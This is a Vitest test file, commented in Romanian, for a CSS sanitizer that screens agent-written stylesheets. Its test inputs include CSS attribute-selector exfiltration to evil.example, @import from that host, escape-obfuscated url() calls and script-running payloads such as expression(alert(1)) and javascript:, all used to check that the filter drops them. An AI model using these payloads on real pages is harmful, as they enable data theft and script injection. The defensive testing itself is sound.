import { describe, expect, it } from "vitest";
import type { CssDropReason } from "@uishapeshifter/contracts";
import { decodeEscapes, splitStatements, stripComments, validateCss } from "./css";
import { SNIPPET_CHARS } from "./result";

function reasonsOf(css: string): CssDropReason[] {
  return validateCss(css).dropped.map((d) => d.reason);
}

/** Spațiile nu contează la comparat foaia rămasă. */
function flat(css: string): string {
  return css.replace(/\s+/g, " ").trim();
}

describe("validateCss: ce trece", () => {
  it("CSS-ul obișnuit al unei rețete trece întreg", () => {
    const css = `
      ytd-reel-shelf-renderer, [aria-label="Shorts"] { display: none !important; }
      header nav > a:first-child { order: -1; font-size: 20px; }
      .card { background: #fff; color: rgb(20 20 20); border-radius: 8px; grid-template-columns: 1fr 2fr; }
      button::after { content: "{ nu e acoladă; }"; }`;
    const result = validateCss(css);
    expect(result.dropped).toEqual([]);
    expect(flat(result.css)).toBe(flat(css));
  });

  it("@media, @supports și @keyframes sunt permise", () => {
    const css = `@media (max-width: 600px) { .sidebar { display: none; } }
      @supports (display: grid) { main { display: grid; } }
      @keyframes apare { from { opacity: 0; } to { opacity: 1; } }`;
    const result = validateCss(css);
    expect(result.dropped).toEqual([]);
    expect(flat(result.css)).toBe(flat(css));
  });

  it("gol rămâne gol", () => {
    expect(validateCss("")).toEqual({ css: "", dropped: [] });
  });

  it("comentariile dispar din foaia rămasă", () => {
    expect(validateCss("/* ascund */ a { color: red; }").css).toBe("a { color: red; }");
  });
});

describe("validateCss: scoate regula, nu toată foaia", () => {
  it("regula cu url() iese, celelalte rămân", () => {
    const result = validateCss(`a { color: red; }
      input[value^="a"] { background: url(https://evil.example/?a); }
      b { font-weight: 700; }`);
    expect(flat(result.css)).toBe("a { color: red; } b { font-weight: 700; }");
    expect(result.dropped).toEqual([
      expect.objectContaining({ reason: "url-function", snippet: expect.stringContaining('input[value^="a"]') }),
    ]);
  });

  it("în @media iese doar regula greșită; un @media rămas gol dispare", () => {
    const kept = validateCss("@media print { a { color: red; } b { background: url(x) } }");
    expect(flat(kept.css)).toBe("@media print { a { color: red; } }");
    expect(kept.dropped.map((d) => d.reason)).toEqual(["url-function"]);

    const empty = validateCss("@media print { b { background: url(x) } }");
    expect(empty.css).toBe("");
  });

  it("motivul are mesaj în română pentru model, iar snippet-ul e scurt", () => {
    const [dropped] = validateCss(`.${"x".repeat(300)} { background: url(x) }`).dropped;
    expect(dropped.message).toMatch(/încarcă ceva din afara paginii/);
    expect(dropped.snippet.length).toBeLessThanOrEqual(SNIPPET_CHARS);
  });
});

describe("validateCss: ce încarcă din afară", () => {
  it.each([
    ["simplu", "a { background: url(x.png) }"],
    ["cu majuscule", "a { background: URL(x.png) }"],
    ["cu escape hex", "a { background: u\\72 l(x.png) }"],
    ["cu escape hex lung", "a { background: \\000075rl(x.png) }"],
    ["cu escape simplu", "a { background: u\\rl(x.png) }"],
    ["după un comentariu", "a { background: /* nimic */ url(x.png) }"],
    ["image-set fără url", 'a { background-image: image-set("x.png" 1x) }'],
    ["-webkit-image-set", 'a { background-image: -webkit-image-set("x.png" 1x) }'],
    ["url cu ; în el", "a { background: url(x;y.png) } b { color: red }"],
    ["în @keyframes", "@keyframes x { from { background: url(x) } }"],
  ])("url: %s", (_name, css) => {
    expect(reasonsOf(css)).toEqual(["url-function"]);
  });

  it("@import iese, și fără url(), și scris cu escape", () => {
    expect(reasonsOf('@import "https://evil.example/a.css";')).toEqual(["import"]);
    expect(reasonsOf('@\\69mport "a.css";')).toEqual(["import"]);
  });
});

describe("validateCss: ce rulează cod", () => {
  it.each([
    ["expression()", "a { width: expression(alert(1)) }"],
    ["javascript:", "a { background: javascript:alert(1) }"],
    ["java script: cu spațiu", "a { x: java script:alert(1) }"],
    ["-moz-binding", "a { -moz-binding: x }"],
    ["behavior:", "a { behavior: x }"],
  ])("%s", (_name, css) => {
    expect(reasonsOf(css)).toEqual(["expression"]);
  });
});

describe("validateCss: interfața noastră e a noastră", () => {
  it.each([
    ["rădăcina shadow", "uishapeshifter-root { display: none }"],
    ["cu id și majuscule", "#UiShapeshifter-host { opacity: 0 }"],
    ["elementele noastre", '[data-agent-id="mascot.bubble"] { display: none }'],
    ["ascuns în CSS nesting", "body { [data-agent-id] { display: none } }"],
    [":host", ":host { display: none }"],
    ["::part", "x-y::part(panel) { display: none }"],
  ])("%s", (_name, css) => {
    expect(reasonsOf(css)).toEqual(["targets-our-ui"]);
  });
});

describe("validateCss: @-reguli și sintaxă", () => {
  it.each([
    ["@font-face", "@font-face { font-family: X; src: local(Arial) }"],
    ["@charset", '@charset "utf-8";'],
    ["@namespace", "@namespace svg x;"],
    ["@layer", "@layer base { a { color: red } }"],
  ])("%s nu e permis", (_name, css) => {
    expect(reasonsOf(css)).toEqual(["unsupported-at-rule"]);
  });

  it.each([
    ["bloc neînchis", "a { color: red"],
    ["acoladă în plus", "a { color: red } }"],
    ["declarație fără selector", "color: red;"],
    ["selector gol", "{ color: red }"],
    ["ghilimele neînchise", 'a { content: "x }'],
  ])("%s → syntax", (_name, css) => {
    expect(reasonsOf(css)).toContain("syntax");
  });

  it("după o acoladă în plus, regulile bune de după rămân", () => {
    const result = validateCss("a { color: red } } b { color: blue }");
    expect(flat(result.css)).toBe("a { color: red } b { color: blue }");
    expect(result.dropped.map((d) => d.reason)).toEqual(["syntax"]);
  });
});

describe("ajutoarele", () => {
  it("decodeEscapes citește escape-urile ca browserul", () => {
    expect(decodeEscapes("u\\72 l")).toBe("url");
    expect(decodeEscapes("\\000075")).toBe("u");
    expect(decodeEscapes("a\\:b")).toBe("a:b");
  });

  it("stripComments scoate și un comentariu neînchis", () => {
    expect(stripComments("a /* x */ b /* y")).toBe("a  b ");
  });

  it("splitStatements nu taie la acolade sau ; din ghilimele", () => {
    expect(splitStatements('a { content: "};" } b { c: d }').map((s) => s.kind)).toEqual(["block", "block"]);
  });
});
